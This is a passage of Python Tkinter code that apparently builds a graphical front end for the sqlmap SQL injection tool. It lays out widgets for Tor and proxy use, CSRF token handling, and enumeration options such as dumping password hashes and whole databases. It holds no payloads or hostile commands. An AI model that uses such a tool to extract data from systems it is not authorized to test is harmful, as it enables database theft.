        self.e_proxy_freq.bind('<<ComboboxSelected>>', self.f_proxy_freq)
        self.e_proxy_freq.grid(row=6, column=1, sticky='ew', pady=3)
        # --ignore-proxy      Ignore system default HTTP proxy
        self.chk_ignore_proxy = ttk.Checkbutton(data_lf_2)
        self.chk_ignore_proxy_var = tkinter.StringVar()
        self.chk_ignore_proxy.config(text="ignore-proxy", variable=self.chk_ignore_proxy_var, onvalue="on",
                                     offvalue="off", command=self.f_ignore_proxy)
        self.chk_ignore_proxy.grid(row=7, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --ignore-redirects  Ignore redirection attempts
        self.chk_ignore_redirects = ttk.Checkbutton(data_lf_2)
        self.chk_ignore_redirects_var = tkinter.StringVar()
        self.chk_ignore_redirects.config(text="ignore-redirects", variable=self.chk_ignore_redirects_var, onvalue="on",
                                         offvalue="off", command=self.f_ignore_redirects)
        self.chk_ignore_redirects.grid(row=8, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --ignore-timeouts   Ignore connection timeouts
        self.chk_ignore_timeouts = ttk.Checkbutton(data_lf_2)
        self.chk_ignore_timeouts_var = tkinter.StringVar()
        self.chk_ignore_timeouts.config(text="ignore-timeouts", variable=self.chk_ignore_timeouts_var, onvalue="on",
                                        offvalue="off", command=self.f_ignore_timeouts)
        self.chk_ignore_timeouts.grid(row=9, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --ignore-code=IG..  Ignore HTTP error code (e.g. 401)
        self.chk_ignore = ttk.Checkbutton(data_lf_2)
        self.chk_ignore_var = tkinter.StringVar()
        self.chk_ignore.config(text="ignore-code", variable=self.chk_ignore_var, onvalue="on",
                               offvalue="off", command=self.f_ignore)
        self.chk_ignore.grid(row=10, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_ignore = ttk.Combobox(data_lf_2)
        self.e_ignore_value = tkinter.StringVar()
        self.e_ignore.config(textvariable=self.e_ignore_value, state='disabled', width=18)
        self.e_ignore['values'] = ('*', '502', '302', '401', '400', '403', '404', '405', '406', '413', '414', '429',
                                   '500', '301', '503', '504', '520', '401,402,406,500')
        self.e_ignore.current(0)
        self.e_ignore.bind('<<ComboboxSelected>>', self.f_ignore)
        self.e_ignore.grid(row=10, column=1, sticky='ew', pady=3)
        # --tor               Use Tor anonymity network
        self.chk_tor_use = ttk.Checkbutton(data_lf_2)
        self.chk_tor_use_var = tkinter.StringVar()
        self.chk_tor_use.config(text="tor", variable=self.chk_tor_use_var, onvalue="on",
                                offvalue="off", command=self.f_tor_use)
        self.chk_tor_use.grid(row=11, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --tor-port=TORPORT  Set Tor proxy port other than default
        self.chk_tor_port = ttk.Checkbutton(data_lf_2)
        self.chk_tor_port_var = tkinter.StringVar()
        self.chk_tor_port.config(text="tor-port", variable=self.chk_tor_port_var, onvalue="on",
                                 offvalue="off", command=self.f_tor_port)
        self.chk_tor_port.grid(row=12, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_tor_port = ttk.Combobox(data_lf_2, width=18)
        self.e_tor_port_value = tkinter.StringVar()
        self.e_tor_port.config(textvariable=self.e_tor_port_value, state='disabled')
        self.e_tor_port['values'] = ('9150', '9050')
        self.e_tor_port.current(0)
        self.e_tor_port.bind('<<ComboboxSelected>>', self.f_tor_port)
        self.e_tor_port.grid(row=12, column=1, sticky='ew', pady=3)
        # --tor-type=TORTYPE  Set Tor proxy type (HTTP - default, SOCKS4 or SOCKS5)
        self.chk_tor_type = ttk.Checkbutton(data_lf_2)
        self.chk_tor_type_var = tkinter.StringVar()
        self.chk_tor_type.config(text="tor-type", variable=self.chk_tor_type_var, onvalue="on",
                                 offvalue="off", command=self.f_tor_type)
        self.chk_tor_type.grid(row=13, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_tor_type = ttk.Combobox(data_lf_2, width=18)
        self.e_tor_type_value = tkinter.StringVar()
        self.e_tor_type.config(textvariable=self.e_tor_type_value, state='disabled')
        self.e_tor_type['values'] = ('HTTP', 'HTTPS', 'SOCKS4', 'SOCKS5')
        self.e_tor_type.current(0)
        self.e_tor_type.bind('<<ComboboxSelected>>', self.f_tor_type)
        self.e_tor_type.grid(row=13, column=1, sticky='ew', pady=3)
        # --check-tor         Check to see if Tor is used properly
        self.chk_tor = ttk.Checkbutton(data_lf_2)
        self.chk_tor_var = tkinter.StringVar()
        self.chk_tor.config(text="check-tor", variable=self.chk_tor_var, onvalue="on",
                            offvalue="off", command=self.f_tor)
        self.chk_tor.grid(row=14, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --delay=DELAY       Delay in seconds between each HTTP request
        self.chk_delay = ttk.Checkbutton(data_lf_2)
        self.chk_delay_var = tkinter.StringVar()
        self.chk_delay.config(text="delay", variable=self.chk_delay_var, onvalue="on",
                              offvalue="off", command=self.f_delay)
        self.chk_delay.grid(row=15, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_delay = ttk.Combobox(data_lf_2)
        self.e_delay_value = tkinter.StringVar()
        self.e_delay.config(textvariable=self.e_delay_value, state='disabled', width=18)
        self.e_delay['values'] = ('0.5', '1', '1.5')
        self.e_delay.current(0)
        self.e_delay.bind('<<ComboboxSelected>>', self.f_delay)
        self.e_delay.grid(row=15, column=1, sticky='ew', pady=3)
        self.e_delay.columnconfigure(0, weight=1)
        # --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
        self.chk_timeout = ttk.Checkbutton(data_lf_2)
        self.chk_time_out_var = tkinter.StringVar()
        self.chk_timeout.config(text="timeout", variable=self.chk_time_out_var, onvalue="on",
                                offvalue="off", command=self.f_time_out)
        self.chk_timeout.grid(row=16, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_time_out = ttk.Combobox(data_lf_2)
        self.e_timeout_value = tkinter.StringVar()
        self.e_time_out.config(textvariable=self.e_timeout_value, state='disabled', width=18)
        self.e_time_out['values'] = ('15', '20', '25', '30')
        self.e_time_out.current(0)
        self.e_time_out.bind('<<ComboboxSelected>>', self.f_time_out)
        self.e_time_out.grid(row=16, column=1, sticky='ew', pady=3)
        self.e_time_out.columnconfigure(0, weight=1)
        # DATA 3
        data_lf_3 = ttk.Labelframe(data3, text='Session & request handling')
        data_lf_3.columnconfigure(1, weight=1)
        data_lf_3.grid(row=0, column=0, pady=10, ipadx=3, ipady=3, sticky='we')
        # --retries=RETRIES   Retries when the connection timeouts (default 3)
        self.chk_retries = ttk.Checkbutton(data_lf_3)
        self.chk_retries_var = tkinter.StringVar()
        self.chk_retries.config(text="retries", variable=self.chk_retries_var, onvalue="on",
                                offvalue="off", command=self.f_retries)
        self.chk_retries.grid(row=0, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_retries = ttk.Combobox(data_lf_3)
        self.e_retries_value = tkinter.StringVar()
        self.e_retries.config(textvariable=self.e_retries_value, state='disabled', width=18)
        self.e_retries['values'] = ('4', '5', '6')
        self.e_retries.current(0)
        self.e_retries.bind('<<ComboboxSelected>>', self.f_retries)
        self.e_retries.grid(row=0, column=1, sticky='ew', pady=3)
        self.e_retries.columnconfigure(0, weight=1)
        # --randomize=RPARAM  Randomly change value for given parameter(s)
        self.chk_randomize = ttk.Checkbutton(data_lf_3)
        self.chk_randomize_var = tkinter.StringVar()
        self.chk_randomize.config(text="randomize", variable=self.chk_randomize_var, onvalue="on",
                                  offvalue="off", command=self.f_randomize)
        self.chk_randomize.grid(row=1, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_randomize = ttk.Combobox(data_lf_3, width=18)
        self.e_randomize_value = tkinter.StringVar()
        self.e_randomize.config(textvariable=self.e_randomize_value, state='disabled')
        self.e_randomize['values'] = 'id2=foo,bar,tre,sat'
        self.e_randomize.current(0)
        self.e_randomize.bind('<<ComboboxSelected>>', self.f_randomize)
        self.e_randomize.grid(row=1, column=1, sticky='ew', pady=3)
        self.e_randomize.columnconfigure(0, weight=1)
        # --safe-url=SAFURL   Url address to visit frequently during testing
        self.chk_safe_url = ttk.Checkbutton(data_lf_3)
        self.chk_safe_url_var = tkinter.StringVar()
        self.chk_safe_url.config(text="safe-url", variable=self.chk_safe_url_var, onvalue="on",
                                 offvalue="off", command=self.f_safe_url)
        self.chk_safe_url.grid(row=2, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_safe_url = ttk.Entry(data_lf_3, width=18)
        self.e_safe_url.grid(row=2, column=1, sticky='ew', pady=3)
        self.e_safe_url.columnconfigure(0, weight=1)
        # --safe-post=SAFE..  POST data to send to a safe URL
        self.chk_safe_post = ttk.Checkbutton(data_lf_3)
        self.chk_safe_post_var = tkinter.StringVar()
        self.chk_safe_post.config(text="safe-post", variable=self.chk_safe_post_var, onvalue="on",
                                  offvalue="off", command=self.f_safe_post)
        self.chk_safe_post.grid(row=3, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_safe_post = ttk.Entry(data_lf_3, width=18)
        self.e_safe_post.grid(row=3, column=1, sticky='ew', pady=3)
        self.e_safe_post.columnconfigure(0, weight=1)
        # --safe-req=SAFER..  Load safe HTTP request from a file
        self.chk_safe_req = ttk.Checkbutton(data_lf_3)
        self.chk_safe_req_var = tkinter.StringVar()
        self.chk_safe_req.config(text="safe-req", variable=self.chk_safe_req_var, onvalue="on",
                                 offvalue="off", command=self.f_safe_req)
        self.chk_safe_req.grid(row=4, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_safe_req = ttk.Entry(data_lf_3, width=18)
        self.e_safe_req.grid(row=4, column=1, sticky='ew', pady=3)
        self.e_safe_req.columnconfigure(0, weight=1)
        # --safe-freq=SAFE..  Test requests between two visits to a given safe URL
        self.chk_safe_freq = ttk.Checkbutton(data_lf_3)
        self.chk_safe_freq_var = tkinter.StringVar()
        self.chk_safe_freq.config(text="safe-freq", variable=self.chk_safe_freq_var, onvalue="on",
                                  offvalue="off", command=self.f_safe_freq)
        self.chk_safe_freq.grid(row=5, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_safe_freq = ttk.Entry(data_lf_3, width=18)
        self.e_safe_freq.grid(row=5, column=1, sticky='ew', pady=3)
        self.e_safe_freq.columnconfigure(0, weight=1)
        # --skip-urlencode    Skip URL encoding of POST data
        self.chk_skip_urlencode = ttk.Checkbutton(data_lf_3)
        self.chk_skip_urlencode_var = tkinter.StringVar()
        self.chk_skip_urlencode.config(text="skip-urlencode", variable=self.chk_skip_urlencode_var, onvalue="on",
                                       offvalue="off", command=self.f_skip_urlencode)
        self.chk_skip_urlencode.grid(row=6, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --csrf-token=CSR..  Parameter used to hold anti-CSRF token
        self.chk_csrf_token = ttk.Checkbutton(data_lf_3)
        self.chk_csrf_token_var = tkinter.StringVar()
        self.chk_csrf_token.config(text="csrf-token", variable=self.chk_csrf_token_var, onvalue="on",
                                   offvalue="off", command=self.f_csrf_token)
        self.chk_csrf_token.grid(row=7, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_csrf_token = ttk.Entry(data_lf_3, width=18)
        self.e_csrf_token.grid(row=7, column=1, sticky='ew', pady=3)
        self.e_csrf_token.columnconfigure(0, weight=1)
        # --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit
        self.chk_csrf_method = ttk.Checkbutton(data_lf_3)
        self.chk_csrf_method_var = tkinter.StringVar()
        self.chk_csrf_method.config(text="csrf-method", variable=self.chk_csrf_method_var, onvalue="on",
                                    offvalue="off", command=self.f_csrf_method)
        self.chk_csrf_method.grid(row=8, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_csrf_method = ttk.Combobox(data_lf_3)
        self.e_csrf_method_value = tkinter.StringVar()
        self.e_csrf_method.config(textvariable=self.e_csrf_method_value, state='disabled', width=18)
        self.e_csrf_method['values'] = ('POST', 'HELLO', 'HELO', 'EHLO', 'LIST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS',
                                        'TRACE', 'TRACK', 'PATCH',
                                        'CONNECT', 'DEBUG', 'GET', '   GET', 'get')
        self.e_csrf_method.current(0)
        self.e_csrf_method.bind('<<ComboboxSelected>>', self.f_csrf_method)
        self.e_csrf_method.grid(row=8, column=1, sticky='ew', pady=3)
        # --csrf-data=POST data to send during anti-CSRF token page visit
        self.chk_csrf_data_method = ttk.Checkbutton(data_lf_3)
        self.chk_csrf_data_method_var = tkinter.StringVar()
        self.chk_csrf_data_method.config(text="csrf-data", variable=self.chk_csrf_data_method_var, onvalue="on",
                                         offvalue="off", command=self.f_csrf_data)
        self.chk_csrf_data_method.grid(row=9, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_csrf_data = ttk.Entry(data_lf_3, width=18)
        self.e_csrf_data.grid(row=9, column=1, sticky='ew', pady=3)
        self.e_csrf_data.columnconfigure(0, weight=1)
        # --csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token
        self.chk_csrf_url = ttk.Checkbutton(data_lf_3)
        self.chk_csrf_url_var = tkinter.StringVar()
        self.chk_csrf_url.config(text="csfr-url", variable=self.chk_csrf_url_var, onvalue="on",
                                 offvalue="off", command=self.f_csrf_url)
        self.chk_csrf_url.grid(row=10, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_csrf_url = ttk.Entry(data_lf_3, width=18)
        self.e_csrf_url.grid(row=10, column=1, sticky='ew', pady=3)
        self.e_csrf_url.columnconfigure(0, weight=1)
        # --csrf-retries    Retries for anti-CSRF token retrieval
        self.chk_csrf_retries = ttk.Checkbutton(data_lf_3)
        self.chk_csrf_retries_var = tkinter.StringVar()
        self.chk_csrf_retries.config(text="csrf-retries", variable=self.chk_csrf_retries_var, onvalue="on",
                                     offvalue="off", command=self.f_csrf_retries)
        self.chk_csrf_retries.grid(row=11, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_csrf_retries = ttk.Combobox(data_lf_3)
        self.e_csrf_retries_value = tkinter.StringVar()
        self.e_csrf_retries.config(textvariable=self.e_csrf_retries_value, state='disabled', width=18)
        self.e_csrf_retries['values'] = ('4', '5', '6')
        self.e_csrf_retries.current(0)
        self.e_csrf_retries.bind('<<ComboboxSelected>>', self.f_csrf_retries)
        self.e_csrf_retries.grid(row=11, column=1, sticky='ew', pady=3)
        # --force-ssl         Force usage of SSL/HTTPS requests
        self.chk_force_ssl = ttk.Checkbutton(data_lf_3)
        self.chk_force_ssl_var = tkinter.StringVar()
        self.chk_force_ssl.config(text="force-ssl", variable=self.chk_force_ssl_var, onvalue="on",
                                  offvalue="off", command=self.f_force_ssl)
        self.chk_force_ssl.grid(row=12, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --hpp      Use HTTP parameter pollution
        self.chk_hpp = ttk.Checkbutton(data_lf_3)
        self.chk_hpp_var = tkinter.StringVar()
        self.chk_hpp.config(text="hpp", variable=self.chk_hpp_var, onvalue="on",
                            offvalue="off", command=self.f_hpp)
        self.chk_hpp.grid(row=13, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --eval=EVALCODE     Evaluate provided Python code before the request (e.g."import hashlib;id2=hashlib.md5(id)
        self.chk_eval_code = ttk.Checkbutton(data_lf_3)
        self.chk_eval_code_var = tkinter.StringVar()
        self.chk_eval_code.config(text="eval", variable=self.chk_eval_code_var, onvalue="on",
                                  offvalue="off", command=self.f_eval_code)
        self.chk_eval_code.grid(row=14, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_eval_code = ttk.Combobox(data_lf_3, width=18)
        self.e_eval_code_value = tkinter.StringVar()
        self.e_eval_code.config(textvariable=self.e_eval_code_value, state='disabled')
        self.e_eval_code['values'] = "import%20hashlib;id2=hashlib.md5(id).hexdigest()"
        self.e_eval_code.current(0)
        self.e_eval_code.bind('<<ComboboxSelected>>', self.f_eval_code)
        self.e_eval_code.grid(row=14, column=1, sticky='ew', pady=3)
        self.e_eval_code.columnconfigure(0, weight=1)
        # --chunked            Use HTTP chunked transfer encoded (POST) requests
        self.chk_chunked = ttk.Checkbutton(data_lf_3)
        self.chk_chunked_var = tkinter.StringVar()
        self.chk_chunked.config(text="chunked", variable=self.chk_chunked_var, onvalue="on",
                                offvalue="off", command=self.f_chunked)
        self.chk_chunked.grid(row=15, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # ENUMERATION_1
        enumerate_lf = ttk.Labelframe(enumeration_f, text='Identity & users')
        enumerate_lf.columnconfigure(1, weight=1)
        enumerate_lf.grid(row=0, column=0, sticky='ew', padx=4, pady=4)
        # --current-user      Retrieve DBMS current user
        self.chk_current_user = ttk.Checkbutton(enumerate_lf)
        self.chk_current_user_var = tkinter.StringVar()
        self.chk_current_user.config(text="current-user", variable=self.chk_current_user_var, onvalue="on",
                                     offvalue="off", command=self.f_current_user)
        self.chk_current_user.grid(row=0, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --current-db        Retrieve DBMS current database
        self.chk_current_db = ttk.Checkbutton(enumerate_lf)
        self.chk_current_db_var = tkinter.StringVar()
        self.chk_current_db.config(text="current-db", variable=self.chk_current_db_var, onvalue="on",
                                   offvalue="off", command=self.f_current_db)
        self.chk_current_db.grid(row=3, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # -a, --all           Retrieve everything
        self.chk_all = ttk.Checkbutton(enumerate_lf)
        self.chk_all_var = tkinter.StringVar()
        self.chk_all.config(text="all", variable=self.chk_all_var, onvalue="on",
                            offvalue="off", command=self.f_all)
        self.chk_all.grid(row=7, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # -passwords         Enumerate DBMS users password hashes
        self.chk_passwords = ttk.Checkbutton(enumerate_lf)
        self.chk_passwords_var = tkinter.StringVar()
        self.chk_passwords.config(text="passwords", variable=self.chk_passwords_var, onvalue="on",
                                  offvalue="off", command=self.f_passwords)
        self.chk_passwords.grid(row=1, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --privileges        Enumerate DBMS users privileges
        self.chk_privileges = ttk.Checkbutton(enumerate_lf)
        self.chk_privileges_var = tkinter.StringVar()
        self.chk_privileges.config(text="privileges", variable=self.chk_privileges_var, onvalue="on",
                                   offvalue="off", command=self.f_privileges)
        self.chk_privileges.grid(row=5, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --comments          Retrieve DBMS comments
        self.chk_comments = ttk.Checkbutton(enumerate_lf)
        self.chk_comments_var = tkinter.StringVar()
        self.chk_comments.config(text="comments", variable=self.chk_comments_var, onvalue="on",
                                 offvalue="off", command=self.f_comments)
        self.chk_comments.grid(row=8, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --tables            Enumerate DBMS database tables
        self.chk_tables = ttk.Checkbutton(enumerate_lf)
        self.chk_tables_var = tkinter.StringVar()
        self.chk_tables.config(text="tables", variable=self.chk_tables_var, onvalue="on",
                               offvalue="off", command=self.f_tables)
        self.chk_tables.grid(row=2, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --columns           Enumerate DBMS database table columns
        self.chk_columns = ttk.Checkbutton(enumerate_lf)
        self.chk_columns_var = tkinter.StringVar()
        self.chk_columns.config(text="columns", variable=self.chk_columns_var, onvalue="on",
                                offvalue="off", command=self.f_columns)
        self.chk_columns.grid(row=6, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --hostname          Retrieve DBMS server hostname
        self.chk_host_name = ttk.Checkbutton(enumerate_lf)
        self.chk_host_name_var = tkinter.StringVar()
        self.chk_host_name.config(text="hostname", variable=self.chk_host_name_var, onvalue="on",
                                  offvalue="off", command=self.f_host_name)
        self.chk_host_name.grid(row=9, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # ENUMERATION_2
        enumerate_lf_2 = ttk.Labelframe(enumeration_f, text='Database structure')
        enumerate_lf_2.columnconfigure(1, weight=1)
        enumerate_lf_2.grid(row=1, column=0, sticky='ew', padx=4, pady=4)
        self.chk_current_db.grid(row=4, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --is-dba   Detect if the DBMS current user is DBA
        self.chk_is_dba = ttk.Checkbutton(enumerate_lf_2)
        self.chk_is_dba_var = tkinter.StringVar()
        self.chk_is_dba.config(text="is-dba", variable=self.chk_is_dba_var, onvalue="on",
                               offvalue="off", command=self.f_is_dba)
        self.chk_is_dba.grid(row=0, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --users             Enumerate DBMS users
        self.chk_users = ttk.Checkbutton(enumerate_lf_2)
        self.chk_users_var = tkinter.StringVar()
        self.chk_users.config(text="users", variable=self.chk_users_var, onvalue="on",
                              offvalue="off", command=self.f_users)
        self.chk_users.grid(row=3, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --roles             Enumerate DBMS users roles
        self.chk_roles = ttk.Checkbutton(enumerate_lf_2)
        self.chk_roles_var = tkinter.StringVar()
        self.chk_roles.config(text="roles", variable=self.chk_roles_var, onvalue="on",
                              offvalue="off", command=self.f_roles)
        self.chk_roles.grid(row=1, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # -dbs               Enumerate DBMS databases
        self.chk_dbs = ttk.Checkbutton(enumerate_lf_2)
        self.chk_dbs_var = tkinter.StringVar()
        self.chk_dbs.config(text="dbs", variable=self.chk_dbs_var, onvalue="on",
                            offvalue="off", command=self.f_dbs)
        self.chk_dbs.grid(row=4, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --schema            Enumerate DBMS schema
        self.chk_schema = ttk.Checkbutton(enumerate_lf_2)
        self.chk_schema_var = tkinter.StringVar()
        self.chk_schema.config(text="schema", variable=self.chk_schema_var, onvalue="on",
                               offvalue="off", command=self.f_schema)
        self.chk_schema.grid(row=2, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --count             Retrieve number of entries for table(s)
        self.chk_count = ttk.Checkbutton(enumerate_lf_2)
        self.chk_count_var = tkinter.StringVar()
        self.chk_count.config(text="count", variable=self.chk_count_var, onvalue="on",
                              offvalue="off", command=self.f_count)
        self.chk_count.grid(row=5, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # ENUMIRATION_3
        dump_lf = ttk.Labelframe(enumeration_f, text='Data retrieval')
        dump_lf.columnconfigure(1, weight=1)
        dump_lf.grid(row=2, column=0, sticky='ew', padx=4, pady=4)
        # -b, --banner        Retrieve DBMS banner
        self.chk_banner = ttk.Checkbutton(dump_lf)
        self.f_banner_var = tkinter.StringVar()
        self.chk_banner.config(text="banner", variable=self.f_banner_var, onvalue="on",
                               offvalue="off", command=self.f_banner)
        self.chk_banner.grid(row=0, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --dump              Dump DBMS database table entries
        self.chk_dump = ttk.Checkbutton(dump_lf)
        self.chk_dump_var = tkinter.StringVar()
        self.chk_dump.config(text="dump", variable=self.chk_dump_var, onvalue="on",
                             offvalue="off", command=self.f_dump)
        self.chk_dump.grid(row=2, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --search            Search column(s), table(s) and/or database name(s)
        self.chk_search = ttk.Checkbutton(dump_lf)
        self.chk_search_var = tkinter.StringVar()
        self.chk_search.config(text="search", variable=self.chk_search_var, onvalue="on",
                               offvalue="off", command=self.f_search)
        self.chk_search.grid(row=4, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
        self.chk_exclude_sysdbs = ttk.Checkbutton(dump_lf)
        self.chk_exclude_sys_dbs_var = tkinter.StringVar()
        self.chk_exclude_sysdbs.config(text="exclude-sysdbs", variable=self.chk_exclude_sys_dbs_var, onvalue="on",
                                       offvalue="off", command=self.f_exclude_sys_dbs)
        self.chk_exclude_sysdbs.grid(row=1, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --first=FIRSTCHAR   First query output word character to retrieve
        self.chk_first = ttk.Checkbutton(dump_lf)
        self.chk_first_var = tkinter.StringVar()
        self.chk_first.config(text="first CHAR", variable=self.chk_first_var, onvalue="on",
                              offvalue="off", command=self.f_first)
        self.chk_first.grid(row=3, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.entry_first_var = tkinter.StringVar()
        self.entry_first = ttk.Entry(dump_lf, width=18, textvariable=self.entry_first_var)
        self.entry_first.grid(row=3, column=1, sticky='ew', pady=3)
        # --last=LASTCHAR     Last query output word character to retrieve
        self.chk_last = ttk.Checkbutton(dump_lf)
        self.chk_last_var = tkinter.StringVar()
        self.chk_last.config(text="last CHAR", variable=self.chk_last_var, onvalue="on",
                             offvalue="off", command=self.f_last)
        self.chk_last.grid(row=5, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.entry_last_var = tkinter.StringVar()
        self.entry_last = ttk.Entry(dump_lf, width=18, textvariable=self.entry_last_var)
        self.entry_last.grid(row=5, column=1, sticky='ew', pady=3)
        # ENUMIRATION_4
        dump_lf_4 = ttk.Labelframe(enumeration_f, text='Statements & procedures')
        dump_lf_4.columnconfigure(1, weight=1)
        dump_lf_4.grid(row=3, column=0, sticky='ew', padx=4, pady=4)
        # --dump-all          Dump all DBMS databases tables entries
        self.chk_dump_all = ttk.Checkbutton(dump_lf_4)
        self.chk_dump_all_var = tkinter.StringVar()
        self.chk_dump_all.config(text="dump-all", variable=self.chk_dump_all_var, onvalue="on",
                                 offvalue="off", command=self.f_dump_all)
        self.chk_dump_all.grid(row=0, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --statements        Retrieve SQL statements being run on DBMS
        self.chk_statements = ttk.Checkbutton(dump_lf_4)
        self.chk_statements_var = tkinter.StringVar()
        self.chk_statements.config(text="statements", variable=self.chk_statements_var, onvalue="on",
                                   offvalue="off", command=self.f_statements)
        self.chk_statements.grid(row=1, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --pivot-column Pivot column name
        self.chk_pivot = ttk.Checkbutton(dump_lf_4)
        self.chk_pivot_var = tkinter.StringVar()
        self.chk_pivot.config(text="pivot-column", variable=self.chk_pivot_var, onvalue="on",
                              offvalue="off", command=self.f_pivot)
        self.chk_pivot.grid(row=2, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_pivot = ttk.Entry(dump_lf_4, width=18)
        self.e_pivot.grid(row=2, column=1, sticky='ew', pady=3)
        # --procs   Retrieve stored procedures/functions and their source
        self.chk_procs = ttk.Checkbutton(dump_lf_4)
        self.chk_procs_var = tkinter.StringVar()
        self.chk_procs.config(text="procs", variable=self.chk_procs_var, onvalue="on",
                              offvalue="off", command=self.f_statements)
        self.chk_procs.grid(row=3, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # Block #1
        dtc_lf = ttk.Labelframe(enumeration_f, text='Objects & row limits')
        dtc_lf.columnconfigure(1, weight=1)
        dtc_lf.grid(row=4, column=0, sticky='ew', padx=4, pady=4)
        dtc_lf.columnconfigure(0, weight=0)
        # -D DB               DBMS database to enumerate
        self.chk_database = ttk.Checkbutton(dtc_lf)
        self.chk_database_enumerate_var = tkinter.StringVar()
        self.chk_database.config(text="DB", variable=self.chk_database_enumerate_var, onvalue="on",
                                 offvalue="off", command=self.f_database_enumerate)
        self.chk_database.grid(row=0, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_database_var = tkinter.StringVar()
        self.e_database_enumerate = ttk.Entry(dtc_lf, width=18, textvariable=self.e_database_var)
        self.e_database_enumerate.grid(row=0, column=1, sticky='ew', pady=3)
        # -T TBL              DBMS database table to enumerate
        self.chk_table = ttk.Checkbutton(dtc_lf)
        self.chk_table_var = tkinter.StringVar()
        self.chk_table.config(text="TBL", variable=self.chk_table_var, onvalue="on",
                              offvalue="off", command=self.f_table)
        self.chk_table.grid(row=1, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_table_var = tkinter.StringVar()
        self.e_table = ttk.Entry(dtc_lf, width=18, textvariable=self.e_table_var)
        self.e_table.grid(row=1, column=1, sticky='ew', pady=3)
        # -C COL              DBMS database table column to enumerate
        self.chk_column = ttk.Checkbutton(dtc_lf)
        self.chk_column_var = tkinter.StringVar()
        self.chk_column.config(text="COL", variable=self.chk_column_var, onvalue="on",
                               offvalue="off", command=self.f_column)
        self.chk_column.grid(row=2, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_column_var = tkinter.StringVar()
        self.e_column = ttk.Entry(dtc_lf, width=18, textvariable=self.e_column_var)
        self.e_column.grid(row=2, column=1, sticky='ew', pady=3)
        # -U USER             DBMS user to enumerate
        self.chk_user = ttk.Checkbutton(dtc_lf)
        self.chk_user_var = tkinter.StringVar()
        self.chk_user.config(text="USER", variable=self.chk_user_var, onvalue="on",
                             offvalue="off", command=self.f_user)
        self.chk_user.grid(row=3, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_user_var = tkinter.StringVar()
        self.e_user = ttk.Entry(dtc_lf, width=18, textvariable=self.e_user_var)
        self.e_user.grid(row=3, column=1, sticky='ew', pady=3)
        # --exclude=EXCLUDE   DBMS database identifier(s) to not enumerate
        self.chk_exclude = ttk.Checkbutton(dtc_lf)
        self.chk_exclude_var = tkinter.StringVar()
        self.chk_exclude.config(text="exclude", variable=self.chk_exclude_var, onvalue="on",
                                offvalue="off", command=self.f_exclude)
